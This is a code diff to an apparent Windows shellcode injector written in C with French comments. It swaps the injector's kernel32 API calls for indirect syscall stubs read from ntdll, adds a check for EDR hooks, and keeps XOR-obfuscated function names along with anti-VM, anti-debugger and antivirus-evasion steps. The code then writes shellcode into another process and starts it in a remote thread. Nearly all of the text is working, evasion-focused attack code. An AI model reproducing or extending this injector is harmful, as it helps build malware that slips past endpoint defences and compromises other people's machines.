@@ -7,18 +7,78 @@ Compile w/
     -s (Strip symbols)
     -fmerge-all-constants (Optimisation des chaines ASCII)
 
-gcc -s -fmerge-all-constants <> -o injector.exe
+gcc -s -fmerge-all-constants <> stubs.o -o injector.exe
 */
-typedef LPVOID (WINAPI* VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
-typedef BOOL (WINAPI* WriteProcessMemory_t)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
-typedef HANDLE (WINAPI* CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-typedef DWORD (WINAPI* WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
+
+DWORD g_SSN_NtAllocateVirtualMemory = 0;
+PVOID g_Stub_NtAllocateVirtualMemory = NULL;
+DWORD g_SSN_NtWriteVirtualMemory = 0;
+PVOID g_Stub_NtWriteVirtualMemory = NULL;
+DWORD g_SSN_NtCreateThreadEx = 0;
+PVOID g_Stub_NtCreateThreadEx = NULL;
+DWORD g_SSN_NtWaitForSingleObject = 0;
+PVOID g_Stub_NtWaitForSingleObject = NULL;
+
+//NtCreateThreadEx
+extern "C" NTSTATUS _stub_NtCreateThreadEx(
+    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, void* Arguments, void* CreateFlags, void* ZeroBits, void* StackSize, void* MaximumStackSize, void* AttributeList
+);
+
+//Following definition taken from  https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls/blob/main/CT_Indirect_Syscalls/CT_Indirect_Syscalls/syscalls.h
+//NtAllocateVirtualMemory
+extern "C" NTSTATUS _stub_NtAllocateVirtualMemory(
+        HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect
+    );
+//NtWriteVirtualMemory
+extern "C" NTSTATUS _stub_NtWriteVirtualMemory(
+        HANDLE ProcessHandle, PVOID BaseAddress, PUCHAR Buffer, SIZE_T NumberOfBytesToWrite, PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
+    );
+//NtWaitForSingleObject
+extern "C" NTSTATUS _stub_NtWaitForSingleObject(
+        HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout
+    );
+
+typedef struct _SYSCALL_STUB {
+    DWORD SyscallId;
+    PVOID SyscallFunc;
+} SYSCALL_STUB, *PSYSCALL_STUB;
+
 typedef BOOL (WINAPI* VirtualFreeEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
 typedef LPVOID (WINAPI * VirtualAllocExNuma_t) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
 typedef BOOL (WINAPI * IsDebuggerPresent_t)();
 typedef void (WINAPI * GetSystemInfo_t)(LPSYSTEM_INFO lpSystemInfo);
 typedef HANDLE (WINAPI * GetCurrentProcess_t)();
 typedef HANDLE (WINAPI * OpenProcess_t)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
+
+_SYSCALL_STUB getDirectSyscallStub(HMODULE hNTDLL, PUCHAR NtFunctionName){
+    SYSCALL_STUB stub = { 0 };
+    PVOID NtFunctionAddr = (PVOID)GetProcAddress(hNTDLL, (LPCSTR)NtFunctionName);
+    if (!NtFunctionAddr) return stub;
+    printf("[+] Function %s at %p\n", NtFunctionName, NtFunctionAddr);
+
+    /*
+    Au début de la fonction il y a : 
+        <0x00>   4C 8B D1           mov r10, rcx
+        <0x04>   B8 ?? 00 00 00     mov eax, [??]   -> Ici le SSN est renseigné avant le changement de contexte vers LSTAR 
+                [...]              [...]
+        <0x12>  0F 05              syscall          -> Get l'addr du syscall on va setup nous même un jump vers ce syscall (ça evite d'avoir un stub syscall dans notre code)
+        <0x14>  C3                 ret 
+    */
+    BYTE expected[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
+    if (memcmp(NtFunctionAddr, expected, sizeof(expected)) != 0) {
+        printf("[*] EDR hooked %s !\n", NtFunctionName);
+        return stub;
+    }
+    DWORD syscallID = *(DWORD*)((BYTE*)NtFunctionAddr + 4);
+    void* syscallAddress = (void*)((BYTE*)NtFunctionAddr + 0x12);
+
+    printf("\t[+] %s stub : SSN 0x%x @ 0x%p\n", NtFunctionName, syscallID, syscallAddress);
+    
+    stub.SyscallId = syscallID;
+    stub.SyscallFunc = syscallAddress;
+
+    return stub;
+}
 
 void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz){
     for (int i = 0; i < data_sz; i++){
@@ -92,20 +152,20 @@ int injectProc(int PID){
     }
     printf("[+] No VM/Emulation detcted\n");
 
-    UCHAR _VirtualAllocEx[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x28, 0x1f, 0x33, 0x0e, 0x3c, 0x2b, 0x11, 0x63 };
-    UCHAR _WriteProcessMemory[] = { 0x25, 0x08, 0x0d, 0x1c, 0x0a, 0x20, 0x2d, 0x06, 0x10, 0x3a, 0x12, 0x2c, 0x23, 0x0c, 0x0e, 0x0a, 0x2d, 0x1e, 0x75 };
-    UCHAR _CreateRemoteThread[] = { 0x31, 0x08, 0x01, 0x09, 0x1b, 0x15, 0x0d, 0x0c, 0x1e, 0x30, 0x15, 0x3a, 0x3a, 0x01, 0x11, 0x00, 0x3e, 0x03, 0x75 };
-    UCHAR _WaitForSingleObject[] = { 0x25, 0x1b, 0x0d, 0x1c, 0x29, 0x1f, 0x2d, 0x3a, 0x1a, 0x31, 0x06, 0x33, 0x0b, 0x26, 0x01, 0x0f, 0x3a, 0x04, 0x01, 0x79 };
+    UCHAR _NtAllocateVirtualMemory[] = { 0x3c, 0x0e, 0x25, 0x04, 0x03, 0x1f, 0x3c, 0x08, 0x07, 0x3a, 0x37, 0x36, 0x1c, 0x1d, 0x16, 0x04, 0x33, 0x2a, 0x10, 0x14, 0x1d, 0x08, 0x1d, 0x68 };
+    UCHAR _NtWriteVirtualMemory[] = { 0x3c, 0x0e, 0x33, 0x1a, 0x06, 0x04, 0x3a, 0x3f, 0x1a, 0x2d, 0x15, 0x2a, 0x0f, 0x05, 0x2e, 0x00, 0x32, 0x08, 0x07, 0x00, 0x72 };
+    UCHAR _NtCreateThreadEx[] = { 0x3c, 0x0e, 0x27, 0x1a, 0x0a, 0x11, 0x2b, 0x0c, 0x27, 0x37, 0x13, 0x3a, 0x0f, 0x0d, 0x26, 0x1d, 0x5f };
+    UCHAR _NtWaitForSingleObject[] = { 0x3c, 0x0e, 0x33, 0x09, 0x06, 0x04, 0x19, 0x06, 0x01, 0x0c, 0x08, 0x31, 0x09, 0x05, 0x06, 0x2a, 0x3d, 0x0d, 0x10, 0x1a, 0x06, 0x7a };    
     UCHAR _VirtualFreeEx[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x2f, 0x01, 0x3a, 0x04, 0x1a, 0x16, 0x69 };
     UCHAR _VirtualAllocExNuma[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x28, 0x1f, 0x33, 0x0e, 0x3c, 0x2b, 0x11, 0x2d, 0x10, 0x32, 0x06, 0x75 };
     UCHAR _IsDebuggerPresent[] = { 0x3b, 0x09, 0x20, 0x0d, 0x0d, 0x05, 0x38, 0x0e, 0x16, 0x2d, 0x31, 0x2d, 0x0b, 0x1a, 0x06, 0x0b, 0x2b, 0x67 };
     UCHAR _OpenProcess[] = { 0x3d, 0x0a, 0x01, 0x06, 0x3f, 0x02, 0x30, 0x0a, 0x16, 0x2c, 0x12, 0x5f };
     UCHAR key[] = { 0x72, 0x7a, 0x64, 0x68, 0x6f, 0x70, 0x5f, 0x69, 0x73, 0x5f, 0x61, 0x5f, 0x6e, 0x69, 0x63, 0x65, 0x5f, 0x67, 0x75, 0x79 };
         
-    XOR(_VirtualAllocEx, sizeof(_VirtualAllocEx), key, sizeof(key));
-    XOR(_WriteProcessMemory, sizeof(_WriteProcessMemory), key, sizeof(key));
-    XOR(_CreateRemoteThread, sizeof(_CreateRemoteThread), key, sizeof(key));
-    XOR(_WaitForSingleObject, sizeof(_WaitForSingleObject), key, sizeof(key));
+    XOR(_NtAllocateVirtualMemory, sizeof(_NtAllocateVirtualMemory), key, sizeof(key));
+    XOR(_NtWriteVirtualMemory, sizeof(_NtWriteVirtualMemory), key, sizeof(key));
+    XOR(_NtCreateThreadEx, sizeof(_NtCreateThreadEx), key, sizeof(key));
+    XOR(_NtWaitForSingleObject, sizeof(_NtWaitForSingleObject), key, sizeof(key));
     XOR(_VirtualFreeEx, sizeof(_VirtualFreeEx), key, sizeof(key));
     XOR(_IsDebuggerPresent, sizeof(_IsDebuggerPresent), key, sizeof(key));
     XOR(_OpenProcess, sizeof(_OpenProcess), key, sizeof(key));
@@ -117,13 +177,10 @@ Resolved functions : \n \
     %s \n \
     %s \n \
     %s \n \
-    %s \n", _VirtualAllocEx, _WriteProcessMemory, _CreateRemoteThread, _WaitForSingleObject, _VirtualFreeEx, _IsDebuggerPresent);
+    %s \n \
+    %s \n", _NtAllocateVirtualMemory, _NtWriteVirtualMemory, _NtCreateThreadEx, _NtWaitForSingleObject, _VirtualFreeEx, _IsDebuggerPresent, _OpenProcess);
 
     HMODULE k32 = GetModuleHandle(TEXT("kernel32.dll"));
-    VirtualAllocEx_t        pVirtualAllocEx      = (VirtualAllocEx_t) GetProcAddress(k32, (LPCSTR)_VirtualAllocEx);
-    WriteProcessMemory_t    pWriteProcessMemory  = (WriteProcessMemory_t) GetProcAddress(k32, (LPCSTR)_WriteProcessMemory);
-    CreateRemoteThread_t    pCreateRemoteThread  = (CreateRemoteThread_t) GetProcAddress(k32, (LPCSTR)_CreateRemoteThread);
-    WaitForSingleObject_t   pWaitForSingleObject = (WaitForSingleObject_t) GetProcAddress(k32, (LPCSTR)_WaitForSingleObject);
     VirtualFreeEx_t         pVirtualFreeEx       = (VirtualFreeEx_t) GetProcAddress(k32, (LPCSTR)_VirtualFreeEx);
     IsDebuggerPresent_t     pIsDebuggerPresent   = (IsDebuggerPresent_t) GetProcAddress(k32, (LPCSTR)_IsDebuggerPresent);
     OpenProcess_t           pOpenProcess         = (OpenProcess_t) GetProcAddress(k32, (LPCSTR)_OpenProcess);
@@ -164,23 +221,45 @@ Resolved functions : \n \
         scSize = sizeof(shellcode_32);
     }
 
-    LPVOID memPoolPtr = pVirtualAllocEx(hProcess, NULL, scSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    HMODULE hntdll = GetModuleHandle(TEXT("ntdll.dll"));
+
+    _SYSCALL_STUB stub_alloc = getDirectSyscallStub(hntdll, _NtAllocateVirtualMemory);
+    g_SSN_NtAllocateVirtualMemory = stub_alloc.SyscallId;
+    g_Stub_NtAllocateVirtualMemory = stub_alloc.SyscallFunc;
+    PVOID memPoolPtr= NULL;
+    _stub_NtAllocateVirtualMemory(hProcess, &memPoolPtr, 0, &scSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+
     if (memPoolPtr == NULL) {
 	    printf("VirtualAllocEx failed: %ul\n", GetLastError());
 	    return 1;
     }
     printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
-    pWriteProcessMemory(hProcess, memPoolPtr, shellcode, scSize, NULL);
-    printf("[+] Shellcode %s written\n", is64 ? "64bit" : "32bit");
+    _SYSCALL_STUB stub_WriteMem = getDirectSyscallStub(hntdll, _NtWriteVirtualMemory);
+    g_SSN_NtWriteVirtualMemory = stub_WriteMem.SyscallId;
+    g_Stub_NtWriteVirtualMemory = stub_WriteMem.SyscallFunc;
+    ULONG bytesWritten = 0;
+    _stub_NtWriteVirtualMemory(hProcess, memPoolPtr, shellcode, scSize, &bytesWritten);
+    printf("[+] Shellcode %s written (%d)\n", is64 ? "64bit" : "32bit", bytesWritten);
 
-    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, 0, NULL);
+
+    // Stub CreateRemoteThreadEx
+    _SYSCALL_STUB stub_CreateRThread = getDirectSyscallStub(hntdll, _NtCreateThreadEx);
+    g_SSN_NtCreateThreadEx = stub_CreateRThread.SyscallId;
+    g_Stub_NtCreateThreadEx = stub_CreateRThread.SyscallFunc;
+    HANDLE  hThread  = NULL;
+    ACCESS_MASK acc  = THREAD_ALL_ACCESS;
+    _stub_NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, FALSE, NULL, NULL, NULL, NULL);
     if (hThread == NULL) {
         printf("CreateRemoteThread failed : %ul\n", GetLastError());
         return 1;
     }
     printf("[+] Remote thread created.\n");
     printf("[+] Waiting for thread.\n");
-    pWaitForSingleObject(hThread, INFINITE);
+    _SYSCALL_STUB stub_WaitForObj = getDirectSyscallStub(hntdll, _NtWaitForSingleObject);
+    g_SSN_NtWaitForSingleObject = stub_WaitForObj.SyscallId;
+    g_Stub_NtWaitForSingleObject = stub_WaitForObj.SyscallFunc;
+    _stub_NtWaitForSingleObject(hThread, FALSE, NULL);
+
     printf("[+] Sehellcode done.\n");
     free(tooBigForAVtoScan);
 
